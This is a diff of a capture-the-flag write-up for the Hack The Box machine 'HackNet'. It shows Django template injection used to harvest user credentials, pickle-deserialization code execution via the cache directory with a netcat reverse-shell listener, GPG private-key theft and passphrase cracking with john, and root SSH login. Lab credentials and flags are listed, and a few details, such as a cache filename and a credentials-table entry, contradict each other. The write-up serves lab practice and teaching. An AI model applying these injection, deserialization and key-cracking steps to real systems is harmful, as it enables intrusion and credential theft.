@@ -1,14 +1,75 @@
-![[Pasted image 20260124115631.png]]
 
+# #HTB 
+
+
+![[Pasted image 20260124115631.png|247]]
+
+# HTB: HackNet
+
+**Machine IP:** `10.129.232.4`
+**Difficulty:** Medium
+**OS:** Linux
+
+---
+
+## Tools Used
+- `rustscan` / `nmap` - Port discovery
+- `Burp Suite` - SSTI testing
+- `Python` - Custom exploitation scripts
+- `ssh` - Remote access
+- `gpg2john` / `john` - PGP passphrase cracking
+- `rlwrap` - Netcat listener with line editing
+- `sqlmap` / manual DB analysis - Database enumeration
+
+---
+## TL;DR
+
+A Django-based social networking site vulnerable to SSTI allows extracting user credentials. SSH access as `mikey` leads to pickle deserialization RCE, then PGP key cracking grants root.
+
+---
+
+
+## Step 1: Port Scanning
+
+```
+rustscan -a 10.129.232.4
+```
 
 ![[Pasted image 20260124115706.png]]
 
+### Nmap Detailed Scan
+**Open ports:** 22 (SSH), 80 (HTTP)
+```
+sudo nmap -sC -sV 10.129.232.4 -p 22,80
+```
 
 ![[Pasted image 20260124120826.png]]
+- **Results:** OpenSSH 9.2p1, nginx 1.22.1 (redirects to `http://hacknet.htb`)
 
+
+
+
+
+## Step 2: Web Application Discovery
+
+Add to `/etc/hosts`:
+```
+10.129.232.4 hacknet.htb
+```
+
+The site is a social network for hackers with features including:
+- User registration/login
+- Profile editing
+- Posts, likes, comments    
+- Profile pictures
 
 ![[Pasted image 20260124121825.png]]
+- Technology: **Django** on nginx.
 
+
+### Technology Stack
+- **Web Server:** Nginx 1.22.1
+- **Framework:** Django (Python)
 
 ![[Pasted image 20260124121917.png]]
 
@@ -16,14 +77,40 @@
 ![[Pasted image 20260124122048.png]]
 
 
+
+
+
+
+## Step 3: Server-Side Template Injection (SSTI)
+
+### Profile Username Field Vulnerability
+
+The profile editing page allows changing the username. The username field is **vulnerable to SSTI**.
+
 ![[Pasted image 20260124123443.png]]
 
 
-![[Pasted image 20260124160203.png]]
+### Testing SSTI
 
+Changing username to `{{users}}` exposes the application's data model:
+
+![[Pasted image 20260124160203.png]]
+**Output shows:** `<QuerySet [<SocialUser: hexhunter>, <SocialUser: shadowcaster>, ...]>`
+
+This confirms **Django SSTI** - the `{{...}}` syntax is being evaluated by the template engine.
 
 ![[Pasted image 20260124161144.png]]
 
+
+
+
+
+
+## Step 4: Credential Extraction via SSTI
+
+### Python Script for Automated Extraction
+
+Using the SSTI vulnerability, a Python script was created to extract all user credentials:
 
 I’ll create [a Python script](https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/ssti.py) to automatically go through all posts and extract the creds of all users. It found 26 of them in total.
 
@@ -275,14 +362,70 @@ if __name__ == "__main__":
 
 ```
 
+### Extracted Credentials
 
+The script extracted **26 user credentials** including:
+
+|Username|Email|Password|
+|---|---|---|
+|zero_day|zero_day@hushmail.com|Zer0D@yH@ck|
+|blackhat_wolf|blackhat_wolf@cypherx.com|Bl@ckW0lfH@ck|
+|codebreaker|codebreaker@ciphermail.com|C0d3Br3@k!|
+|brute_force|brute_force@ciphermail.com|BrUt3F0rc3#|
+|shadowcaster|shadowcaster@darkmail.net|Sh@dOwC@st!|
+|**backdoor_bandit**|**mikey@hacknet.htb**|**mYd4rks1dEisH3re**|
+|...|...|...|
 ![[Pasted image 20260124163229.png]]
 
 
+
+
+
+
+## Step 5: SSH Access as Mikey
+
+```
+ssh mikey@hacknet.htb
+# Password: mYd4rks1dEisH3re
+```
+
 ![[Pasted image 20260124163551.png]]
+
+### User Flag
+```
+mikey@hacknet:~$ cat user.txt
+1a878830014e6d5b1c24a773aa9141f6
+```
+
 ![[Pasted image 20260124163608.png]]
 
 
+
+
+
+
+## Step 6: Privilege Escalation - Pickle Deserialization
+
+### Django Cache Directory
+
+I’ve covered pickle deserialization some time ago in the [DevOops writeup](https://ch3ng625.github.io/devoops). The context is somewhat different, but the process of generating the serialized data is mostly the same.
+
+I’ll create this script to generate the pickle payload:
+
+After running it on the box, the cache files are generated, this time owned by `mikey`.
+
+```
+mikey@hacknet:/var/tmp/django_cache$ ls -la
+total 20
+drwxrwxrwx 2 sandy www-data 4096 Jan 24 07:15 .
+-rw-r--r-- 1 mikey mikey    126 Jan 24 07:15 1f0acfe7480a469402f1852f8313db86.djcache
+-rw-r--r-- 1 mikey mikey    126 Jan 24 07:15 90dbbaf8fb1e54369abdeb4ba1efc106.djcache
+```
+- *Note: The directory is writable by `sandy` and `www-data`.
+
+![[Pasted image 20260124174402.png]]
+
+### Pickle Payload Generation
 
 ```
 
@@ -314,36 +457,90 @@ with open("/var/tmp/django_cache/90dbab8f3b1e54369abdeb4ba1efc106.djcache", 'wb'
 
 ```
 
-
-I’ve covered pickle deserialization some time ago in the [DevOops writeup](https://ch3ng625.github.io/devoops). The context is somewhat different, but the process of generating the serialized data is mostly the same.
-
-I’ll create [this script](https://github.com/ch3ng625/CTF-scripts/blob/main/HTB/HackNet/djcache_rce.py) to generate the pickle payload:
-
-After running it on the box, the cache files are generated, this time owned by `mikey`.
+#### Execute Payload
+```
+mikey@hacknet:/var/tmp/django_cache$ python3 djcache_rce.py
+```
 
 
-![[Pasted image 20260124174402.png]]
+### Netcat Listener
 
 I’ll start a `netcat` listener and reload the `/explore` page. A shell as `sandy` is immediately sent back.
+
+```
+rlwrap nc -lvnp 8001
+```
+
+Reloading the `/explore` page triggers the pickle deserialization.
+
+**Reverse shell received as `sandy`!**
 
 ![[Pasted image 20260124174415.png]]
 
 
+
+
+
+
+## Step 7: Sandy User Enumeration
+
+```
+sandy@hacknet:~$ id
+uid=1001(sandy) gid=33(www-data) groups=33(www-data)
+sandy@hacknet:~$ ls -la .gnupg/private-keys-v1.d/
+total 20
+-rw------- 1 sandy sandy 1255 Sep 5 11:33 0646B1CF582AC499934D8503DF066A6DCE4DFA9.key
+-rw------- 1 sandy sandy 2088 Sep 5 11:33 armored_key.asc
+-rw------- 1 sandy sandy 1255 Sep 5 11:33 EF995B85C8B33B9FC53695B9A3B597B325562F4F.key
+```
+
 ![[Pasted image 20260124175106.png]]
 
+### Extract PGP Private Key
+```
+sandy@hacknet:~/.gnupg/private-keys-v1.d$ cat armored_key.asc
+-----BEGIN PGP PRIVATE KEY BLOCK-----
+... (PGP key content) ...
+-----END PGP PRIVATE KEY BLOCK-----
+```
 
 ![[Pasted image 20260124175121.png]]
 
 
+
+
+
+## Step 8: Cracking PGP Passphrase
+
+### Convert to John Format
+```
+gpg2john armored_key.asc > hash.txt
+```
+
 ![[Pasted image 20260124175308.png]]
 
+
+### Crack with John the Ripper
+```
+john --wordlist=/home/thunder/Downloads/rockyou.txt hash.txt
+```
+
+- **Cracked passphrase:** `sweetheart`
 
 ![[Pasted image 20260124175715.png]]
 
 
+
+
+
+
+## Step 9: MySQL Root Password Discovery
+
+### Database Dump Analysis
+
+From the extracted credentials or database dump, the MySQL root password was discovered:
+
 ```
-
-
 LOCK TABLES `SocialNetwork_socialmessage` WRITE;
 /*!40000 ALTER TABLE `SocialNetwork_socialmessage` DISABLE KEYS */;
 INSERT INTO `SocialNetwork_socialmessage` VALUES
@@ -354,13 +551,82 @@ INSERT INTO `SocialNetwork_socialmessage` VALUES
 (50,'2024-12-29 20:30:41.806921','Alright. But be careful, okay? Here’s the password: h4ck3rs4re3veRywh3re99. Let me know when you’re done.',1,18,22),
 ```
 
+- `h4ck3rs4re3veRywh3re99`
 
 
+
+
+
+
+## Step 10: SSH Access as Root
+
+```
+ssh root@hacknet.htb
+# Password: h4ck3rs4re3veRywh3re99
+```
 
 ![[Pasted image 20260124180122.png]]
 
+### Root Flag
+```
+root@hacknet:~# cat root.txt
+5ad358fe55de62266eaf640687e287f0
+```
 
 ![[Pasted image 20260124180243.png]]
 
 
+
+
+
+## Step 11: Machine Owned
+
 ![[Pasted image 20260124180256.png]]
+
+---
+
+### Attack Chain
+
+```
+Port Scan (22,80)
+       ↓
+Web Enumeration → hacknet.htb (Django Social Network)
+       ↓
+Profile Edit → SSTI Vulnerability ({{users}})
+       ↓
+Custom Python Script → Extract 26 User Credentials
+       ↓
+SSH as mikey → User Flag
+       ↓
+Django Cache Directory → Pickle Deserialization
+       ↓
+Malicious Pickle Payload → Reverse Shell as sandy
+       ↓
+PGP Private Key Discovery → Passphrase Cracking (sweetheart)
+       ↓
+Database Analysis → MySQL Root Password
+       ↓
+SSH as root → Root Flag
+```
+
+
+---
+
+## Flags
+
+|Flag|Value|
+|---|---|
+|User|`1a878830014e6d5b1c24a773aa9141f6`|
+|Root|`5ad358fe55de62266eaf640687e287f0`|
+
+---
+
+## Credentials Table
+
+|User|Password|Source|
+|---|---|---|
+|mikey|mYd4rks1dEisH3re|SSTI extraction|
+|sandy|sweetheart|Cracked PGP passphrase|
+|root|h4ck3rs4re3veRywh3re99|Database dump|
+
+---
